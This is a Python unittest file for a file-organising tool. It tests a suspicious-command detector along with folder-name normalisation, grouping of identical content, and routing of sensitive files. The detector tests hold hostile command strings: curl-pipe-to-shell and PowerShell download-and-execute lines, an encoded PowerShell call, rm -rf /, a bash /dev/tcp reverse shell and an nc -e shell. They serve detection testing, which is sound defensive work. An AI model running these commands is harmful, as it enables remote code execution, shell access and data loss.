"""Folder-name drift, identical-content grouping, slash-safe folders, suspicious-command warnings."""
from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from app.core.content_cache import ContentIntelligenceCache
from app.core.content_intelligence import plan_content_intelligence
from app.core.evidence import extract_evidence
from app.core.privacy import detect_suspicious_commands
from app.models.schemas import FileInfo


def file_info(path: Path) -> FileInfo:
    return FileInfo(
        path=str(path), filename=path.name, extension=path.suffix.lower(),
        size_kb=1, date_created="2026-01-01",
    )


def row(item_id: int, category: str, subcategory: str, **extra) -> dict:
    base = {
        "id": item_id, "category": category, "subcategory": subcategory,
        "confidence": "high", "reasoning": "r", "evidence_quote": "",
        "filename_conflict": "none", "suggested_name": "", "name_evidence": "",
    }
    base.update(extra)
    return base


class SuspiciousCommandTests(unittest.TestCase):
    def test_flags_download_and_run(self):
        self.assertTrue(detect_suspicious_commands("curl -fsSL http://example.invalid/x.sh | sh"))
        self.assertTrue(detect_suspicious_commands("wget -qO- http://example.invalid/x | sudo bash"))
        self.assertTrue(detect_suspicious_commands("iwr http://example.invalid/a.ps1 | iex"))
        self.assertTrue(detect_suspicious_commands("iex (New-Object Net.WebClient).DownloadString('http://x')"))

    def test_flags_other_patterns(self):
        self.assertTrue(detect_suspicious_commands("powershell -enc " + "A" * 40))
        self.assertTrue(detect_suspicious_commands("echo aGk= | base64 -d | sh"))
        self.assertTrue(detect_suspicious_commands("rm -rf /"))
        self.assertTrue(detect_suspicious_commands("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
        self.assertTrue(detect_suspicious_commands("nc -e /bin/sh 10.0.0.1 4444"))
        self.assertTrue(detect_suspicious_commands("rm -rf /*"))
        self.assertTrue(detect_suspicious_commands("Remove-Item -Recurse -Force C:\\"))

    def test_flags_download_then_execute_as_separate_commands(self):
        self.assertTrue(detect_suspicious_commands(
            "curl -fsSL https://example.invalid/tool -o /tmp/tool && bash /tmp/tool"
        ))
        self.assertTrue(detect_suspicious_commands(
            "wget -O setup.sh https://example.invalid/setup; chmod +x setup.sh; ./setup.sh"
        ))

    def test_ordinary_scripts_are_not_flagged(self):
        for text in (
            "curl -o archive.zip https://example.com/archive.zip",
            "rm -rf /tmp/build_cache",
            "rm -rf ~/projects/old/build",
            "Remove-Item -Recurse -Force C:\\Users\\me\\Temp\\build",
            "nc -zv localhost 443",
            "for f in *.log; do gzip \"$f\"; done",
            "echo 'use curl then pipe results to jq'",
            "SELECT * FROM users;",
        ):
            self.assertEqual(detect_suspicious_commands(text), [], text)

    def test_detection_never_executes_content(self):
        with (
            patch("subprocess.run") as run,
            patch("subprocess.Popen") as popen,
            patch("os.system") as system,
        ):
            self.assertTrue(detect_suspicious_commands("curl https://x.invalid | sh"))
        run.assert_not_called()
        popen.assert_not_called()
        system.assert_not_called()

    def test_evidence_carries_a_plain_warning_without_quoting_the_command(self):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install_helper.sh"
            path.write_text("#!/bin/sh\ncurl -fsSL http://example.invalid/setup.sh | sh\n", encoding="utf-8")
            evidence = extract_evidence(file_info(path))
        joined = " ".join(evidence.warnings)
        self.assertIn("Security:", joined)
        self.assertIn("never runs", joined)
        self.assertNotIn("example.invalid", joined)
        self.assertTrue(evidence.suspicious_commands)


class FolderConsistencyTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.cache = ContentIntelligenceCache(self.root / "cache.db")

    def tearDown(self):
        self.cache.close()
        self.temp.cleanup()

    def _write(self, name: str, text: str) -> Path:
        path = self.root / name
        path.write_text(text, encoding="utf-8")
        return path

    def test_slash_in_subcategory_does_not_collapse_to_misc(self):
        source = self._write("demo.txt", "C and C++ source code for a buffer demo. " * 6)
        result = plan_content_intelligence(
            [file_info(source)], str(self.root), ["fake/model"], cache=self.cache,
            completion_fn=lambda _m: json.dumps({"files": [row(0, "Software Development", "C/C++ Source Code")]}),
        )
        item = result.suggestions[0]
        self.assertEqual(item.category, "Software Development")
        self.assertNotEqual(item.category, "Misc")
        self.assertNotIn("/", item.subcategory)

    def test_slashes_in_both_folder_labels_remain_single_names(self):
        source = self._write("demo.txt", "C and C++ source code for a buffer demo. " * 6)
        result = plan_content_intelligence(
            [file_info(source)], str(self.root), ["fake/model"], cache=self.cache,
            completion_fn=lambda _m: json.dumps({
                "files": [row(0, "Languages/C and C++", "Examples/Pointers")]
            }),
        )
        item = result.suggestions[0]
        self.assertEqual(item.category, "Languages C and C++")
        self.assertEqual(item.subcategory, "Examples Pointers")
        self.assertNotIn("/", item.target_path.replace("/", "", 1))

    def test_identical_content_shares_a_folder_but_keeps_its_own_answer(self):
        text = "region,quarter,revenue\nNorth,Q1 2026,1250000\nSouth,Q1 2026,980000\n" * 3
        first = self._write("sales_a.txt", text)
        second = self._write("export_final.txt", text)
        sent = []

        def completion(messages):
            payload = json.loads(messages[1]["content"])
            sent.extend(item["current_name"] for item in payload["files"])
            folders = {"sales_a.txt": ("Business", "Sales Data"), "export_final.txt": ("Finance", "Revenue Reports")}
            return json.dumps({"files": [
                row(item["id"], *folders[item["current_name"]]) for item in payload["files"]
            ]})

        result = plan_content_intelligence(
            [file_info(first), file_info(second)], str(self.root), ["fake/model"],
            cache=self.cache, completion_fn=completion,
        )
        self.assertEqual(sorted(sent), ["export_final.txt", "sales_a.txt"])
        self.assertEqual({s.target_path for s in result.suggestions}, {"Business/Sales Data"})

    def test_identical_content_converges_across_batches_and_keeps_names(self):
        evidence = "Shared quarterly evidence for regional revenue planning. " * 5
        first = self._write("sales_a.txt", evidence)
        second = self._write("sales_b.md", evidence)
        calls = []

        def completion(messages):
            payload = json.loads(messages[1]["content"])
            row_data = payload["files"][0]
            calls.append(row_data["current_name"])
            category = "Business" if row_data["current_name"] == "sales_a.txt" else "Finance"
            extension = Path(row_data["current_name"]).suffix
            return json.dumps({"files": [row(
                row_data["id"],
                category,
                "Revenue Reports",
                evidence_quote="Shared quarterly evidence",
                suggested_name=f"Quarterly_Revenue{extension}",
                name_evidence="Shared quarterly evidence",
            )]})

        result = plan_content_intelligence(
            [file_info(first), file_info(second)],
            str(self.root),
            ["fake/model"],
            cache=self.cache,
            completion_fn=completion,
            batch_size=1,
        )
        self.assertEqual(calls, ["sales_a.txt", "sales_b.md"])
        self.assertEqual(
            {item.target_path for item in result.suggestions},
            {"Business/Revenue Reports"},
        )
        self.assertEqual(
            [item.suggested_name for item in result.suggestions],
            ["Quarterly_Revenue.txt", "Quarterly_Revenue.md"],
        )

    def test_better_duplicate_folder_wins_over_initial_misc(self):
        evidence = "Shared quarterly evidence for regional revenue planning. " * 5
        first = self._write("first.txt", evidence)
        second = self._write("second.txt", evidence)

        def completion(messages):
            row_data = json.loads(messages[1]["content"])["files"][0]
            if row_data["current_name"] == "first.txt":
                return json.dumps({"files": [row(0, "Misc", "General")]})
            return json.dumps({"files": [row(
                0,
                "Business",
                "Revenue",
                evidence_quote="Shared quarterly evidence",
            )]})

        result = plan_content_intelligence(
            [file_info(first), file_info(second)],
            str(self.root),
            ["fake/model"],
            cache=self.cache,
            completion_fn=completion,
            batch_size=1,
        )
        self.assertEqual(
            {item.target_path for item in result.suggestions},
            {"Business/Revenue"},
        )

    def test_harmonized_duplicate_folder_is_persisted_for_partial_scans(self):
        evidence = "Shared quarterly evidence for regional revenue planning. " * 5
        first = self._write("sales_a.txt", evidence)
        second = self._write("sales_b.txt", evidence)

        def completion(messages):
            row_data = json.loads(messages[1]["content"])["files"][0]
            category = "Business" if row_data["current_name"] == "sales_a.txt" else "Finance"
            return json.dumps({"files": [row(
                row_data["id"],
                category,
                "Revenue",
                evidence_quote="Shared quarterly evidence",
            )]})

        plan_content_intelligence(
            [file_info(first), file_info(second)],
            str(self.root),
            ["fake/model"],
            cache=self.cache,
            completion_fn=completion,
            batch_size=1,
        )
        calls = []
        partial = plan_content_intelligence(
            [file_info(second)],
            str(self.root),
            ["fake/model"],
            cache=self.cache,
            completion_fn=lambda _messages: calls.append(1) or "{}",
            batch_size=1,
        )
        self.assertEqual(calls, [])
        self.assertEqual(partial.suggestions[0].target_path, "Business/Revenue")

    def test_duplicate_grouping_does_not_override_sensitive_context(self):
        evidence = "Ordinary shared notes without embedded credentials. " * 5
        public = self._write("public.txt", evidence)
        private = self._write("credentials_ABCDE1234F.txt", evidence)

        def completion(messages):
            row_data = json.loads(messages[1]["content"])["files"][0]
            return json.dumps({"files": [row(
                row_data["id"],
                "Work",
                "Notes",
                evidence_quote="Ordinary shared notes",
            )]})

        result = plan_content_intelligence(
            [file_info(public), file_info(private)],
            str(self.root),
            ["fake/cloud-model"],
            cache=self.cache,
            completion_fn=completion,
            batch_size=1,
        )
        public_item, private_item = result.suggestions
        self.assertEqual(public_item.target_path, "Work/Notes")
        self.assertTrue(private_item.sensitive)
        self.assertEqual(private_item.target_path, "Misc/Sensitive Review")
        self.assertFalse(private_item.selected)

    def test_later_batches_see_folders_chosen_earlier(self):
        one = self._write("a.txt", "Bash script that compresses nightly log files. " * 5)
        two = self._write("b.txt", "Python helper that totals invoice line items. " * 5)
        seen = []

        def completion(messages):
            payload = json.loads(messages[1]["content"])
            seen.append(payload["existing_folders"])
            return json.dumps({"files": [row(0, "Software", "Scripts")]})

        plan_content_intelligence(
            [file_info(one), file_info(two)], str(self.root), ["fake/model"],
            cache=self.cache, completion_fn=completion, batch_size=1,
        )
        self.assertEqual(len(seen), 2)
        self.assertNotIn("Software/Scripts", seen[0])
        self.assertIn("Software/Scripts", seen[1])


if __name__ == "__main__":
    unittest.main()
